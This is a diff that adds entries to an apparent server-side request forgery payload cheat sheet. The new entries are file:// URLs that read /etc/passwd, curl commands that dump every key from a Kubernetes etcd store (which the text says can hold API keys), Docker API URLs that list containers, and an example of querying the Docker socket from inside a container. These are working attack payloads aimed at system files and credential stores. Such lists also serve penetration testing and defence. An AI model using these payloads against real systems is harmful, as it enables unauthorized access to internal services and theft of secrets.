@@ -153,6 +153,13 @@ List:
 
 ## SSRF via URL Scheme
 
+File Wrapper
+
+```powershell
+file:///etc/passwd
+file://\/\/etc/passwd
+```
+
 Dict Wrapper
 The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
 
@@ -395,6 +402,27 @@ http://100.100.100.200/latest/meta-data/
 http://100.100.100.200/latest/meta-data/instance-id
 http://100.100.100.200/latest/meta-data/image-id
 ```
+
+### SSRF URL for Kubernetes ETCD
+
+Can contain API keys and internal ip and ports
+
+```powershell
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+```
+
+### SSRF URL for Docker
+
+```powershell
+http://127.0.0.1:2375/v1.24/containers/json
+
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
+```
+
 
 ## Thanks to
 
